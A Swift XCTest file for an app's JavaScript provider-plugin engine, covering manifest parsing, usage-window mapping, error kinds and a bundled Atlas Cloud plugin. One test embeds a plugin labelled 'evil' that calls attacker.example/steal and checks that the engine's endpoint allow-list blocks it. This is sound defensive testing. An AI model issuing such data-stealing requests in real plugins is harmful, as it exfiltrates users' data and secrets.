import XCTest
@testable import BirdNion

/// Tests for the JS provider plugin engine (JavaScriptCore, `defineProvider`
/// contract compatible with CodexBar's plugin API). Uses injected transports —
/// no network.
final class PluginEngineTests: XCTestCase {

    private func stubTransport(status: Int = 200,
                               body: String = "{}",
                               headers: [String: String] = [:],
                               recorder: NSMutableArray? = nil) -> PluginHTTPTransport {
        { request, _ in
            if let recorder {
                recorder.add([
                    "url": request.url?.absoluteString ?? "",
                    "authorization": request.value(forHTTPHeaderField: "Authorization") ?? "",
                    "method": request.httpMethod ?? "",
                ])
            }
            return PluginHTTPResponse(
                url: request.url?.absoluteString ?? "",
                status: status,
                headers: headers,
                bodyText: body)
        }
    }

    func testManifestParsedFromDefineProvider() throws {
        let engine = try PluginEngine(source: """
        defineProvider({
          id: "demo", name: "Demo Provider",
          endpoints: ["https://api.demo.test"],
          auth: { type: "bearer", secret: "DEMO_API_KEY" },
          settings: [{ key: "DEMO_API_KEY", title: "Demo key", type: "secure" }],
          capabilities: ["http-status"],
          fetchUsage(ctx) { return { empty: true }; }
        });
        """)
        XCTAssertEqual(engine.manifest.id, "demo")
        XCTAssertEqual(engine.manifest.name, "Demo Provider")
        XCTAssertEqual(engine.manifest.auth?.type, "bearer")
        XCTAssertEqual(engine.manifest.capabilities, ["http-status"])
        guard case .origin(let url) = engine.manifest.endpoints[0] else {
            return XCTFail("expected origin endpoint")
        }
        XCTAssertEqual(url.host, "api.demo.test")
    }

    func testMissingDefineProviderFails() {
        XCTAssertThrowsError(try PluginEngine(source: "var x = 1;")) { error in
            guard case PluginEngineError.invalidDefinition = error else {
                return XCTFail("expected invalidDefinition, got \(error)")
            }
        }
    }

    func testAsyncFetchMapsRateWindows() throws {
        let recorder = NSMutableArray()
        let engine = try PluginEngine(
            source: """
            defineProvider({
              id: "quota-demo", name: "Quota Demo",
              endpoints: ["https://api.quota.test"],
              auth: { type: "bearer", secret: "QUOTA_KEY" },
              settings: [],
              async fetchUsage(ctx) {
                const r = await ctx.http.getJSON("https://api.quota.test/v1/usage");
                if (r.status !== 200) throw ctx.fail.apiFailure("bad status");
                return {
                  primary: { usedPercent: r.json.used, windowMinutes: 300,
                             resetsAt: "2030-01-01T00:00:00Z" },
                  secondary: { usedPercent: 10, windowMinutes: 10080 },
                  extraWindows: [{ id: "m", title: "Monthly", usedPercent: 55 }],
                  identity: { email: "u@demo.test", loginMethod: "API" },
                  dataConfidence: "exact"
                };
              }
            });
            """,
            transport: stubTransport(body: #"{"used": 42}"#, recorder: recorder))
        engine.secretResolver = { _ in "sk-demo" }

        let status = PluginSnapshotMapper.status(
            try engine.fetchUsage(), id: "quota-demo", displayName: "Quota Demo")
        XCTAssertEqual(status.windows.count, 3)
        XCTAssertEqual(status.windows[0].label, "5 giờ")
        XCTAssertEqual(status.windows[0].usedPct, 42)
        XCTAssertEqual(status.windows[0].remainingPct, 58)
        XCTAssertEqual(status.windows[0].windowSeconds, 18000)
        XCTAssertNotNil(status.windows[0].resetDate)
        XCTAssertEqual(status.windows[1].label, "Tuần")
        XCTAssertEqual(status.windows[2].label, "Monthly")
        XCTAssertEqual(status.windows[2].usedPct, 55)
        XCTAssertEqual(status.accountLabel, "u@demo.test")

        // Auth header was injected natively with the resolved secret.
        let sent = recorder.firstObject as? [String: String]
        XCTAssertEqual(sent?["authorization"], "Bearer sk-demo")
        XCTAssertEqual(sent?["method"], "GET")
    }

    func testEndpointPolicyRejectsUndeclaredOrigin() throws {
        let engine = try PluginEngine(
            source: """
            defineProvider({
              id: "evil", name: "Evil", endpoints: ["https://ok.test"],
              settings: [],
              fetchUsage(ctx) {
                return ctx.http.get("https://attacker.example/steal")
                  .then(function () { return { empty: true }; });
              }
            });
            """,
            transport: stubTransport())
        XCTAssertThrowsError(try engine.fetchUsage()) { error in
            guard let e = error as? PluginFetchError, e.kind == .networkFailure else {
                return XCTFail("expected networkFailure for blocked origin, got \(error)")
            }
            XCTAssertTrue(e.message.contains("endpoint not allowed"))
        }
    }

    func testFailKindsSurface() throws {
        let engine = try PluginEngine(
            source: """
            defineProvider({
              id: "failer", name: "Failer", endpoints: ["https://api.f.test"],
              settings: [],
              fetchUsage(ctx) { throw ctx.fail.rateLimited("slow down", { retryAfterSeconds: 5 }); }
            });
            """,
            transport: stubTransport())
        XCTAssertThrowsError(try engine.fetchUsage()) { error in
            guard let e = error as? PluginFetchError else {
                return XCTFail("expected PluginFetchError, got \(error)")
            }
            XCTAssertEqual(e.kind, .rateLimited)
            XCTAssertEqual(e.message, "slow down")
        }
    }

    func testUsageKnownFalseMapsInactive() throws {
        let engine = try PluginEngine(
            source: """
            defineProvider({
              id: "idle", name: "Idle", endpoints: [], settings: [],
              fetchUsage(ctx) {
                return { primary: { usageKnown: false, windowMinutes: 300,
                                    resetsAt: "2030-01-01T00:00:00Z" } };
              }
            });
            """,
            transport: stubTransport())
        let status = PluginSnapshotMapper.status(
            try engine.fetchUsage(), id: "idle", displayName: "Idle")
        XCTAssertTrue(status.windows[0].isInactive)
        XCTAssertEqual(status.windows[0].usedPct, 0)
    }

    func testFetchResultSourceLabelUnwrapped() throws {
        let engine = try PluginEngine(
            source: """
            defineProvider({
              id: "src", name: "Src", endpoints: [], settings: [],
              fetchUsage(ctx) {
                return { usage: { primary: { usedPercent: 7, windowMinutes: 300 } },
                         sourceLabel: "API key" };
              }
            });
            """,
            transport: stubTransport())
        let status = PluginSnapshotMapper.status(
            try engine.fetchUsage(), id: "src", displayName: "Src")
        XCTAssertEqual(status.sourceLabel, "API key")
        XCTAssertEqual(status.windows[0].usedPct, 7)
    }

    func testCostBalanceMapsCredits() throws {
        let engine = try PluginEngine(
            source: """
            defineProvider({
              id: "bal", name: "Bal", endpoints: [], settings: [],
              fetchUsage(ctx) { return { cost: { balance: 12.5, currency: "usd" } }; }
            });
            """,
            transport: stubTransport())
        let status = PluginSnapshotMapper.status(
            try engine.fetchUsage(), id: "bal", displayName: "Bal")
        XCTAssertEqual(status.creditsRemaining, 12.5)
    }

    func testBundledAtlasCloudPluginLoads() throws {
        let url = Bundle(for: type(of: self)).url(
            forResource: "atlascloud", withExtension: "js", subdirectory: "Plugins")
        // Plugin may live in the app bundle rather than the test bundle —
        // fall back to the repo path.
        let source: String
        if let url, let s = try? String(contentsOf: url, encoding: .utf8) {
            source = s
        } else {
            let repoRoot = URL(fileURLWithPath: #filePath)
                .deletingLastPathComponent()
                .deletingLastPathComponent()
            source = try String(
                contentsOf: repoRoot.appendingPathComponent(
                    "BirdNion/Resources/Plugins/atlascloud.js"),
                encoding: .utf8)
        }
        let engine = try PluginEngine(source: source)
        XCTAssertEqual(engine.manifest.id, "atlascloud")
        XCTAssertEqual(engine.manifest.name, "Atlas Cloud")
        XCTAssertEqual(engine.manifest.auth?.secret, "ATLASCLOUD_API_KEY")
    }
}
